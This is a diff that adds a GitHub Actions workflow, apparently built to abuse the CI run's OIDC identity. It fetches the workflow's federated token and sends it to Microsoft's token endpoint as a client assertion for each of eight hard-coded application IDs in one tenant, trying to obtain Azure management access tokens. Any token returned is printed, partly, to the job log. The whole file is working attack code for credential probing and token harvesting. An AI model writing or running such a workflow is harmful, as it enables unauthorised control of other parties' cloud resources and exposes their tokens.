@@ -1,0 +1,47 @@
+name: azfic2
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  f:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: exchange
+        env:
+          TEN: e8adc959-bf67-48e0-95b4-318b5f73946c
+        run: |
+          set +e
+          O=$(curl -s -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          export OIDC=$(echo "$O" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))")
+          echo "oidc_len=${#OIDC}"
+          cat > ids.txt <<'IDS'
+          032854b2-ba65-4dd6-bdd4-4e86b8756667
+          1459b1f6-7a5b-4300-93a2-44b4a651759f
+          a1c42e17-82a8-41a5-906d-3eaca8b54607
+          abfa0a7c-a6b6-4736-8310-5855508787cd
+          2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6
+          d6529b06-857c-4e9e-81d0-eee83f0320ab
+          f1996472-dd17-447c-bcdb-f8b76dd9b861
+          b9590f55-e173-495c-9010-15beb8611a43
+          IDS
+                    python3 - <<'PY'
+          import os,urllib.request,urllib.parse,json
+          TEN=os.environ['TEN']; TOK=os.environ['OIDC']
+          ids=[l.strip() for l in open('ids.txt') if l.strip()]
+          for cid in ids:
+              data=urllib.parse.urlencode({'grant_type':'client_credentials','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':TOK,'client_id':cid,'scope':'https://management.azure.com/.default'}).encode()
+              req=urllib.request.Request('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',data=data)
+              try:
+                  r=urllib.request.urlopen(req,timeout=20); b=r.read().decode()
+                  print('BODY['+cid+']=HTTP200 '+b[:200],flush=True)
+              except urllib.error.HTTPError as e:
+                  b=e.read().decode()
+                  try:
+                      j=json.loads(b); msg=j.get('error_description','')
+                  except Exception:
+                      msg=b
+                  print('BODY['+cid+']='+str(e.code)+' '+msg.replace(chr(10),' ')[:700],flush=True)
+          PY
